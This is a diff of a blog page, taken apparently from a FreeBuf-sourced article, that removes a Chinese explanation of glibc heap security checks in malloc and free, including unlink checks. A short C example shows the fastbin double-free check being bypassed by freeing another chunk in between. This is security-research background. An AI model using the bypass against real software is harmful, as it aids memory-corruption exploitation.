-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.从fastbin中取出chunk后，检查size是否属于fastbin</div><div class="line">2.从smallbin中除去chunk后，检查victim-&gt;bk-&gt;fd == victim</div><div class="line">3.从unsortbin取chunk时，要检查2*size_t&lt;chunk_size&lt;内存总分配量</div><div class="line">4.从largebin取chunk时，切分后的chunk要加入unsortedbin,需要检查 unsortedbin的第一个chunk的bk是否指向unsortedbin</div></pre></td></tr></table></figure>
-<h2 id="0×04-free机制"><a href="#0×04-free机制" class="headerlink" title="0×04 free机制"></a>0×04 free机制</h2><h3 id="1-首先使用-chunksize-p-宏获取p的size"><a href="#1-首先使用-chunksize-p-宏获取p的size" class="headerlink" title="1.首先使用 chunksize(p) 宏获取p的size"></a>1.首先使用 chunksize(p) 宏获取p的size</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#define PREV_INUSE 0x1</div><div class="line">#define IS_MMAPPED 0x2</div><div class="line">#define NON_MAIN_ARENA 0x4</div><div class="line">#define SIZE_BITS (PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)</div><div class="line">#define chunksize(p) ((p)-&gt;size &amp; ~(SIZE_BITS))</div></pre></td></tr></table></figure>
-<p>也就是直接屏蔽了控制位信息，不过不要紧，chunk的分配是 2*sizeof(size_t) 对齐的，所以屏蔽低三位对大小无影响</p>
-<h3 id="2-安全检查："><a href="#2-安全检查：" class="headerlink" title="2.安全检查："></a>2.安全检查：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chunk的指针地址不能溢出</div><div class="line">chunk 的大小 &gt;= MINSIZE(最小分配大小)，并且检查地址是否对齐</div></pre></td></tr></table></figure>
-<h3 id="3-大小为fastbin的情况-不改变inuse位"><a href="#3-大小为fastbin的情况-不改变inuse位" class="headerlink" title="3.大小为fastbin的情况(不改变inuse位)"></a>3.大小为fastbin的情况(不改变inuse位)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1).检查下一个chunk的size：2*size_t&lt;chunk_size&lt;内存总分配量</div><div class="line">2).double free检查：</div><div class="line">    检查当前free的chunk是否与fastbin中的第一个chunk相同，相同则报错</div></pre></td></tr></table></figure>
-<p>简单的小例子</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">int main() &#123;</div><div class="line">    char *a=malloc(24);</div><div class="line">    char *b=malloc(24);</div><div class="line">    free(a);</div><div class="line">    free(a);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">int main() &#123;</div><div class="line">    char *a=malloc(24);</div><div class="line">    char *b=malloc(24);</div><div class="line">    free(a);</div><div class="line">    free(b);</div><div class="line">    free(a);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>没问题</p>
-<h3 id="4-其他情况"><a href="#4-其他情况" class="headerlink" title="4.其他情况"></a>4.其他情况</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">1).检查下一个chunk的size：2*size_t&lt;chunk_size&lt;内存总分配量</div><div class="line">    如果当前 chunk 为 sbrk()分配，那么它相邻的下一块 chunk 超过了分配区的地址，会报错</div><div class="line">2).double free检查：</div><div class="line">    检查当前free的chunk是否为top chunk，是则报错</div><div class="line">    根据下一块的inuse标识检查当前free的chunk是否已被free</div><div class="line">3) unlink合并：</div><div class="line">    检查前后chunk是否free，然后向后（top chunk方向）合并，并改变对应的inuse标志位</div><div class="line">    unlink检查： I.当前chunk的size是否等于下一chunk的prev_size</div><div class="line">                II.P-&gt;bk-&gt;fd == P &amp;&amp; P-&gt;bk-&gt;fd == P</div><div class="line">    如果合并后 chunk_size &gt; 64bytes,则调用函数合并fastbin中的chunk到unsortedbin中</div><div class="line">    将合并后的chunk加入unsortedbin</div><div class="line">4) unsortedbin检查</div><div class="line">    需要检查 unsortedbin的第一个chunk的bk是否指向unsortedbin</div></pre></td></tr></table></figure>
-<p>我们可以看到，针对free的检查主要是下一块的size和inuse位，另外fastbin的检查可以用来做double free。</p>
-<h2 id="0×05"><a href="#0×05" class="headerlink" title="0×05"></a>0×05</h2><p>以上就是对堆的情况所做的一些介绍，了解堆的保护机制后，我们便可以在攻击时想办法进行绕过，从而构造出那些光怪陆离的payload。</p>
-<p><strong>*本文原创作者：hellowuzekai，属于FreeBuf奖励计划，禁止转载</strong></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2787,7 +2781,7 @@
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">132</span>
+                <span class="site-state-item-count">133</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
